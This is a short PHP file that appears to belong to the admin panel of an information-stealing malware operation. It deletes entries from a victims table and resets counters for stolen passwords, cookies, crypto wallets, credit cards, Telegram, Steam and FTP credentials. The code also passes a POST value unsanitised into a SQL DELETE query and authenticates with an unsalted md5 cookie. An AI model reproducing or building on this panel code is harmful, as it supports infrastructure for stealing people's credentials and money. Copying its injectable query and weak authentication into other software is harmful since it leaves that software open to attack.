<?php
require("config.php");
require("mysql.php");
ini_set('memory_limit', '-1');
error_reporting(0);

if($_COOKIE["pwd"] === md5($panel_password)){
	if(isset($_POST['id'])){
		$answer = $base->query("DELETE FROM `users` WHERE id  =".$_POST['id']." LIMIT 1");
		$row = $answer->fetchAll();
		header("Location: index.php?page=".$_GET['page']);
	}
	
	if(isset($_POST['all'])){
		
		$answer = $base->query("DELETE FROM `users`");
		$rows = $answer->fetchAll();
		
		$rq = "UPDATE `stat` SET `telegram`='0',`autofill`='0',`passwords`='0',`cookies`='0',`crypto`='0',`steam`='0',`filezilla`='0',`battlenet`='0',`jabber`='0',`cc`='0',`ie`='0'";
        $base->query($rq);
		
		header("Location: index.php?page=".$_GET['page']);
	}
}

?>